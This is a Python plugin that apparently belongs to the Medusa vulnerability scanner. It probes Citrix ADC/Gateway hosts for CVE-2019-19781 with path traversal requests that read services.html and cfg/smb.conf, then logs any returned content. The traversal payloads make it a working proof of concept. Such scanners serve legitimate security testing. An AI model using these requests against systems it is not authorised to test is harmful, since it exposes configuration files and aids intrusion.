#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-19781" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-1-9"  # 插件编辑时间
        self.info['disclosure']='2020-1-7'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CitrixGatewayPathTraversalVulnerability"  # 插件名称
        self.info['name'] ='Citrix网关路径遍历漏洞' #漏洞名称
        self.info['affects'] = "Citrix"  # 漏洞组件
        self.info['desc_content'] = "可以对任意文件进行访问。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "Citrix_ADC和Citrix_Gateway 13.0\r\nCitrix_ADC和NetScaler_Gateway 12.1\r\nCitrix_ADC和NetScaler_Gateway_12.0\r\nCitrix_ADC和NetScaler_Gateway_11.1\r\nCitrix_NetScaler_ADC和NetScaler_Gateway10.5"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    try:
        payloads = ["/vpn/../vpns/services.html", "/vpn/../vpns/cfg/smb.conf"]

        for payload in payloads:
            payload_url = url + payload

            Headers['Content-Type']= 'application/x-www-form-urlencoded',
            Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'


            s = requests.session()
            resp = s.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
            con = resp.text
            code = resp.status_code
            if code == 200 and con.find("encrypt password") != -1 :
                Medusa = "{} 存在Citrix网关路径遍历漏洞(CVE-2019-19781)\r\n 验证数据:\r\nPOC:{}\r\n返回内容:{}\r\n".format(url,payload_url,con)
                _t=VulnerabilityInfo(Medusa)
                ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
                ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

